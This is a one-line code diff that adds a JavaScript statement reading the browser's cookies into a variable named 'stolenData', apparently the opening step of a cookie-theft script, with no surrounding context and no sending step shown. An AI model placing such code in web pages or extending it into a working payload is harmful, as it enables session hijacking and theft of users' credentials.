@@ -1,0 +1,1 @@
+var stolenData = document.cookie; 
